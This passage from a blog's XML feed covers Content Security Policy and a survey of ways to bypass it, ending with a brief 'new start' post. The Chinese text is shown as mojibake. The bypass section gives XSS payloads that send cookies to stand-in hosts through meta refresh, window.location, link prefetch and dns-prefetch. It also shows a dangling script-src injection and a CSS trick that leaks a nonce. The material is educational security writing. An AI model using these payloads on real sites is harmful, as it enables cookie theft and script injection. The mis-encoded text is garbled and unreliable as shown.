allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox</td></tr><tr><td>report-uri</td><td>å€¼ä¸º /report-uriï¼Œæäº¤æ—¥å¿—</td></tr></tbody></table><p>å†…å®¹æºæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><table><thead><tr><th>æº</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>*</td><td>é€šé…ç¬¦ï¼Œå…è®¸ä»»ä½•URLï¼Œé™¤äº†data: blob: filesystem: schemes</td></tr><tr><td>*.foo.com</td><td>å…è®¸åŠ è½½foo.comå­åŸŸçš„èµ„æº</td></tr><tr><td>abc.foo.com</td><td>åªèƒ½åŠ è½½è¿™ä¸ªåŸŸåä¸‹çš„èµ„æº</td></tr><tr><td><a href="https://a.com" target="_blank" rel="noopener">https://a.com</a></td><td>åªèƒ½ç”¨HTTPSåŠ è½½åŸŸåä¸‹çš„èµ„æº</td></tr><tr><td>https:</td><td>é€šè¿‡HTTPSå¯ä»¥åŠ è½½ä»»æ„åŸŸåä¸‹çš„èµ„æº</td></tr><tr><td>â€˜noneâ€™</td><td>ä»£è¡¨ç©ºé›†,å³ä¸åŒ¹é…ä»»ä½•URL,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜selfâ€™</td><td>ä»£è¡¨å’Œæ–‡æ¡£åŒæº,åŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜unsafe-inlineâ€™</td><td>å…è®¸ä½¿ç”¨å†…è”èµ„æº,å¦‚å†…è”çš„\&lt;script>å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„\&lt;style>å…ƒç´ ,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>â€˜unsafe-evalâ€™</td><td>å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td></tr><tr><td>data:</td><td>å…è®¸data: URIä½œä¸ºå†…å®¹æ¥æº</td></tr><tr><td>mediastream:</td><td>å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æº</td></tr></tbody></table><p>å†…å®¹æºæœ‰ä¸‰ç§ï¼šæºåˆ—è¡¨ã€å…³é”®å­—å’Œæ•°æ®ï¼Œå…¶ä¸­<em>ï¼Œ</em>.foo.comï¼Œabc.foo.comï¼Œ<a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> ï¼Œhttps:å±äºæºåˆ—è¡¨ã€‚â€™noneâ€™ï¼Œâ€™selfâ€™ï¼Œâ€™unsafe-inlineâ€™ï¼Œâ€™unsafe-evalâ€™å±äºå…³é”®å­—ã€‚data:ï¼Œmediastream:å±äºæ•°æ®ã€‚</p><p>ä¾‹å­1</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯é»˜è®¤çš„å†…å®¹æºå¿…é¡»ä¸ºåŒæºæˆ–è€…æ˜¯ trustedscripts.foo.com</p><p>ä¾‹å­2</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src 'self' data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡æºå¯ä»¥ä¸ºåŒæºå†…å®¹æˆ–è€…æ˜¯data:å¼•ç”¨çš„èµ„æºï¼Œåª’ä½“æºå¿…é¡»ä½¿ç”¨mediastream:å¼•ç”¨ï¼Œé™¤æ­¤ä»¥å¤–çš„éƒ½æ‰§è¡Œé»˜è®¤å†…å®¹æºåˆ¤æ–­ï¼Œå¿…é¡»ä¸ºåŒæºå†…å®¹ã€‚æ›´åŠ è¯¦ç»†çš„å¯ä»¥çœ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªåœ¨çº¿çš„CSPå¤´éƒ¨ç”Ÿæˆå™¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ·±å…¥ç†è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªCSPå®‰å…¨æ£€æµ‹ç½‘ç«™ï¼Œèƒ½å¤Ÿæä¾›ä¸€äº›å‚è€ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure><h2 id="CSPçš„è¿›åŒ–â€“nonce-script-CSPå’Œstrict-dynamic"><a href="#CSPçš„è¿›åŒ–â€“nonce-script-CSPå’Œstrict-dynamic" class="headerlink" title="CSPçš„è¿›åŒ–â€“nonce script CSPå’Œstrict-dynamic"></a>CSPçš„è¿›åŒ–â€“nonce script CSPå’Œstrict-dynamic</h2><p>è¿™æ˜¯Googleå›¢é˜Ÿ2016å¹´åœ¨<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>ä¸­æ­£å¼æå‡ºçš„CSPç§ç±»ï¼Œä¸ºäº†è§£å†³CSPçˆ†å‡ºçš„å„ç§å„æ ·çš„é—®é¢˜ã€‚</p><h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>åŠ¨æ€ç”Ÿæˆnonceå­—ç¬¦ä¸²ï¼Œåªæœ‰åŒ…å«nonceå­—æ®µå¹¶å­—ç¬¦ä¸²ç›¸ç­‰çš„scriptå—å¯ä»¥è¢«æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥åœ¨åç«¯å®ç°ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½é‡æ–°ç”Ÿæˆï¼Œè¿™æ ·å°±å¯ä»¥æ— è§†å“ªä¸ªåŸŸæ˜¯å¯ä¿¡çš„ï¼Œä¿è¯æ‰€åŠ è½½çš„ä»»ä½•èµ„æºéƒ½æ˜¯å¯ä¿¡çš„ï¼Œå¹¶ä¸”è¿˜èƒ½æ‹¦æˆªåé¢æ’å…¥çš„scriptã€‚</p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure><p>SDæ„å‘³ç€å¯ä¿¡jsç”Ÿæˆçš„jsä»£ç æ˜¯å¯ä¿¡çš„ã€‚</p><p>è¿™ä¸ªCSPè§„åˆ™ä¸»è¦æ˜¯ç”¨æ¥é€‚åº”å„ç§å„æ ·çš„ç°ä»£å‰ç«¯æ¡†æ¶ï¼Œé€šè¿‡è¿™ä¸ªè§„åˆ™ï¼Œå¯ä»¥å¤§å¹…åº¦é¿å…å› ä¸ºé€‚åº”æ¡†æ¶è€Œå˜å¾—æ¾æ•£çš„CSPè§„åˆ™ã€‚</p><h2 id="CSP-Bypassçš„æ–¹æ³•æ€»ç»“"><a href="#CSP-Bypassçš„æ–¹æ³•æ€»ç»“" class="headerlink" title="CSP Bypassçš„æ–¹æ³•æ€»ç»“"></a>CSP Bypassçš„æ–¹æ³•æ€»ç»“</h2><p>CSPå¯¹å‰ç«¯æ”»å‡»çš„é˜²å¾¡ä¸»è¦æœ‰ä¸¤ä¸ªï¼š</p><ol><li>é™åˆ¶jsçš„æ‰§è¡Œã€‚</li><li>é™åˆ¶å¯¹ä¸å¯ä¿¡åŸŸçš„è¯·æ±‚ã€‚</li></ol><p>æ¥ä¸‹æ¥çš„å¤šç§Bypassæ‰‹æ®µä¹Ÿæ˜¯å›´ç»•è¿™ä¸¤ç§çš„</p><h3 id="urlè·³è½¬"><a href="#urlè·³è½¬" class="headerlink" title="urlè·³è½¬"></a>urlè·³è½¬</h3><p>åˆ©ç”¨urlè·³è½¬ï¼Œå›é¿ä¸¥æ ¼çš„CSPã€‚</p><p>åœ¨default-src â€˜noneâ€™çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨metaæ ‡ç­¾å®ç°è·³è½¬</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨å…è®¸unsafe-inlineçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨window.locationï¼Œæˆ–è€…window.openä¹‹ç±»çš„æ–¹æ³•è¿›è¡Œè·³è½¬ç»•è¿‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.location=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>\&lt;a>æ ‡ç­¾é…åˆç«™å†…çš„æŸäº›å¯æ§JSç‚¹å‡»æ“ä½œæ¥è·³è½¬</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $(#foo).click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"foo"</span> <span class="attr">href</span>=<span class="string">"xxxxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç½‘ç«™æœ¬èº«çš„è·³è½¬æ¥å£</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h3 id="lt-link-æ ‡ç­¾é¢„åŠ è½½"><a href="#lt-link-æ ‡ç­¾é¢„åŠ è½½" class="headerlink" title="\&lt;link>æ ‡ç­¾é¢„åŠ è½½"></a>\&lt;link>æ ‡ç­¾é¢„åŠ è½½</h3><p>CSPå¯¹linkæ ‡ç­¾çš„é¢„åŠ è½½åŠŸèƒ½è€ƒè™‘ä¸å®Œå–„ã€‚åœ¨Chromeä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ‡ç­¾å‘é€cookieæˆ–è€…å…¶ä»–æ•°æ®</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨Firefoxä¸‹æ— æ³•ç”¨prefetchï¼Œå› ä¸ºFirefoxæœ‰æ›´é«˜çš„å®‰å…¨è§„èŒƒï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ–¹å¼ï¼Œæ¯”å¦‚dns-prefetchï¼Œå°†cookieä½œä¸ºå­åŸŸåï¼Œç”¨dnsé¢„è§£æçš„æ–¹å¼æŠŠcookieå¸¦å‡ºå»ï¼ŒæŸ¥çœ‹dnsæœåŠ¡å™¨çš„æ—¥å¿—å°±èƒ½å¾—åˆ°cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>linkæ ‡ç­¾é™¤äº†è¿™ä¸¤ç§relï¼Œè¿˜æœ‰preconnectã€prerenderã€subresourceã€preloadç­‰</p><h3 id="åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨"><a href="#åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨" class="headerlink" title="åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨"></a>åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨</h3><p>æœ‰äº›ç½‘ç«™é™åˆ¶åªæœ‰æŸäº›è„šæœ¬æ‰èƒ½ä½¿ç”¨ï¼Œå¾€å¾€ä¼šä½¿ç”¨\&lt;script>æ ‡ç­¾çš„nonceå±æ€§ï¼Œåªæœ‰nonceä¸€è‡´çš„è„šæœ¬æ‰ç”Ÿæ•ˆï¼Œæ¯”å¦‚CSPè®¾ç½®æˆä¸‹é¢è¿™æ ·</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå½“è„šæœ¬æ’å…¥ç‚¹ä¸ºå¦‚ä¸‹çš„æƒ…å†µæ—¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>æ’å…¥ç‚¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ’å…¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨æµè§ˆå™¨çš„å®¹é”™æœºåˆ¶ä¼šæ‹¼æˆä¸€ä¸ªæ–°çš„scriptæ ‡ç­¾ï¼Œå…¶ä¸­çš„srcå¯ä»¥è‡ªç”±è®¾å®š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨DOM-XSS"><a href="#åˆ©ç”¨DOM-XSS" class="headerlink" title="åˆ©ç”¨DOM XSS"></a>åˆ©ç”¨DOM XSS</h3><p>å¦‚æœJSå­˜åœ¨æ“ä½œlocation.hashå¯¼è‡´çš„XSSï¼Œé‚£ä¹ˆè¿™æ ·çš„æ”»å‡»è¯·æ±‚ä¸ä¼šç»è¿‡åå°ï¼Œé‚£ä¹ˆnonceåçš„éšæœºå€¼å°±ä¸ä¼šåˆ·æ–°ã€‚å¯ä»¥è§ä¸‹é¢lorexxarå¸ˆå‚…çš„åšæ–‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰DOMæ“ä½œå¯ä»¥æ’å…¥HTMLå¹¶ä¸”å¯ä»¥æ§åˆ¶æ’å…¥çš„HTMLå†…å®¹ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç»•è¿‡CSP</p><h3 id="åˆ©ç”¨CSS-é™æ€xss-è·å–nonceå€¼"><a href="#åˆ©ç”¨CSS-é™æ€xss-è·å–nonceå€¼" class="headerlink" title="åˆ©ç”¨CSS é™æ€xss è·å–nonceå€¼"></a>åˆ©ç”¨CSS é™æ€xss è·å–nonceå€¼</h3><p>åˆ©ç”¨CSSé€‰æ‹©å™¨æ¥é€å­—èŠ‚è·å–ä¿¡æ¯ï¼Œ^=ä»å¤´éƒ¨åˆ¤æ–­</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ç¡®å®šç¬¬ä¸€ä½ä¸ºcï¼Œé‚£ä¹ˆå°±ä¼šç»§ç»­ä¸‹é¢çš„æ­¥éª¤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="ca"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ca"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cb"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cb"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cc"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯CSSçš„å˜åŒ–ï¼Œæ²¡æœ‰å¼•èµ·æœåŠ¡å™¨é‡æ–°è¯·æ±‚ï¼Œæ‰€ä»¥nonceçš„å€¼ä¸ä¼šæ”¹å˜ï¼Œå·å–å€¼åå³å¯æ‰§è¡Œæˆ‘ä»¬çš„script</p><h3 id="åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®"><a href="#åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®" class="headerlink" title="åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®"></a>åˆ©ç”¨è·¨åŸŸä¼ è¾“æ•°æ®</h3><p>åˆ©ç”¨ä¸€äº›è·¨åŸŸä¼ è¾“çš„æ–¹æ³•æ¥å¼•å…¥JSï¼Œå¯¼è‡´æ‰§è¡Œ</p><p>å…·ä½“çš„å¯ä»¥çœ‹çœ‹å‘†å­ä¸å¼€å£çš„ä¹Œäº‘å¤§ä¼šPPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>å’Œ0CTF2018é¢„é€‰èµ›ä¸­çš„h4xors.club2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS"><a href="#åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS" class="headerlink" title="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS"></a>åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‰§è¡ŒJS</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'self'</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹åªèƒ½åŠ è½½åŒåŸŸä¸‹scriptçš„CSPç­–ç•¥ï¼Œå¦‚æœæœ‰ä¸Šä¼ ç‚¹å¯ä»¥æ§åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨å…¶ä¸­å¤¹æ‚jsä»£ç ï¼Œç„¶åå¼•ç”¨è¯¥æ–‡ä»¶å®Œæˆæ‰§è¡Œã€‚</p><p>å¯ä»¥å‚è€ƒå‰å‡ å¤©æ¢…å­é…’å¸ˆå‚…å†™çš„ä¸Šä¼ Waveæ–‡ä»¶ç»•è¿‡CSPï¼Œæ‰§è¡ŒJS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h3 id="baseæ ‡ç­¾"><a href="#baseæ ‡ç­¾" class="headerlink" title="baseæ ‡ç­¾"></a>baseæ ‡ç­¾</h3><p>åˆ©ç”¨baseæ ‡ç­¾æ”¹å˜èµ„æºåŠ è½½çš„åŸŸï¼Œä»è€Œå¼•å…¥æ¶æ„çš„jsï¼Œé€ æˆjsæ‰§è¡Œ</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å¯ä»¥çœ‹åˆ°CSPçš„ç»•è¿‡æ¯”è¾ƒçœ‹é‡å®é™…åœºæ™¯ï¼Œä¸åŒçš„æƒ…å†µä¸‹æœ‰ç€ä¸åŒçš„ç»•è¿‡æ–¹æ³•ã€‚</p><p>ä½œè€…èƒ½åŠ›æœ‰é™ï¼Œå¦‚æœæ–‡ç« ä¸­æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ¬¢è¿äº¤æµã€‚æœ€åï¼Œæ­å–œRNGï¼</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/09/CSP%20Is%20Dead,%20Long%20Live%20CSP!%20On%20the%20Insecurity%20of%20Whitelists%20and%20the%20Future%20of%20Content%20Security%20Policy/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/10/25/csp-paper/#0x02-CSP%EF%BC%88Content-Security-Policy%EF%BC%89</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/f1de775bc43e</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line"></span><br><span class="line">http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;é¦–å‘åœ¨ä¿¡å®‰ä¹‹è·¯ä¸Š &lt;a href=&quot;https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/z_XmhrTUg_
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CSP" scheme="https://hurricane618.me/tags/CSP/"/>
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>æ–°çš„å¼€å§‹</title>
    <link href="https://hurricane618.me/2018/06/26/new-start/"/>
    <id>https://hurricane618.me/2018/06/26/new-start/</id>
    <published>2018-06-26T03:10:58.000Z</published>
    <updated>2018-07-19T01:05:29.276Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰çš„åšå®¢è’åºŸæ‰äº†ï¼Œæ‰€ä»¥åœ¨githubä¸Šå¼€ä¸€ä¸ªæ–°çš„åšå®¢å¸Œæœ›èƒ½å¤ŸåšæŒä¸‹å»å§ã€‚ä¹Ÿä¸è®²å¤ªå¤šçŸ«æƒ…çš„è¯äº†ï¼Œæ’¸èµ·è¢–å­å°±æ˜¯è‚ã€‚</p><p>ä¸€å¼€å§‹ä¼šæ›´æ–°çš„æ¯”è¾ƒæ…¢ï¼Œhexoçš„åšå®¢è¿˜éœ€è¦ä¸€æ®µæ—¶é—´é€‚åº”ï¼Œä¹‹åä¼šé€æ¸åŠ å¿«ã€‚</p><img src="/2018/06/26/new-start/67863722_p0.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹‹å‰çš„åšå®¢è’åºŸæ‰äº†ï¼Œæ‰€ä»¥åœ¨githubä¸Šå¼€ä¸€ä¸ªæ–°çš„åšå®¢å¸Œæœ›èƒ½å¤ŸåšæŒä¸‹å»å§ã€‚ä¹Ÿä¸è®²å¤ªå¤šçŸ«æƒ…çš„è¯äº†ï¼Œæ’¸èµ·è¢–å­å°±æ˜¯è‚ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹ä¼šæ›´æ–°çš„æ¯”è¾ƒæ…¢ï¼Œhexoçš„åšå®¢è¿˜éœ€è¦ä¸€æ®µæ—¶é—´é€‚åº”ï¼Œä¹‹åä¼šé€æ¸åŠ å¿«ã€‚&lt;/p&gt;
&lt;img src=&quot;/2018/06/26/new-start/
      
    
    </summary>
    
      <category term="æ‚è°ˆ" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="é—²èŠ" scheme="https://hurricane618.me/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
</feed>
